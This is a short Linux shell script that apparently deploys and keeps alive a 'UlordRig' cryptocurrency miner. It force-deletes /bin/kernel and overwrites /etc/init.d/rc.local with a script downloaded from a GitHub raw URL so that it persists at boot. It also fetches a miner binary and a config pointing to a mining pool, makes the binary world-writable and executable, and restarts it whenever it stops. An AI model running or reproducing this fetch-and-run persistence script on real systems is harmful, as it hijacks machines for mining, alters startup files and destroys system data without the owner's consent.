#!/bin/sh

sudo rm -rf /bin/kernel

rcmessage="UlordRig-Linux-V1.0.0"
if cat /etc/init.d/rc.local | grep "$rcmessage">/dev/null
then
echo "local existence"
else 
wget https://raw.githubusercontent.com/bt126260/uld/master/rc.sh -O /etc/init.d/rc.local
fi
if [ ! -d "/opt/miners/UlordRig-Linux-V1.0.0/" ];then
mkdir /opt/miners/UlordRig-Linux-V1.0.0
wget https://raw.githubusercontent.com/bt126260/uld/master/config.json.98.sh -O /opt/miners/UlordRig-Linux-V1.0.0/config.json
wget https://raw.githubusercontent.com/bt126260/uld/master/rig.sh -O /opt/miners/UlordRig-Linux-V1.0.0/ulordrig
sudo chmod 777 /opt/miners/UlordRig-Linux-V1.0.0/ulordrig
fi
message="ulord.bi-chi.com:7100"
if cat /opt/miners/UlordRig-Linux-V1.0.0/config.json | grep "$message">/dev/null
then
echo "existence"
else
wget https://raw.githubusercontent.com/bt126260/uld/master/config.json.98.sh -O /opt/miners/UlordRig-Linux-V1.0.0/config.json
sudo killall ulordrig
sleep 3
cd /opt/miners/UlordRig-Linux-V1.0.0 && ./ulordrig
fi
if test $( pgrep -f ulordrig | wc -l ) -eq 0
then
sudo killall ulordrig
sleep 3
cd /opt/miners/UlordRig-Linux-V1.0.0 && ./ulordrig
else
echo "Process existence"
fi
sleep 1
sudo pidof ulordrig
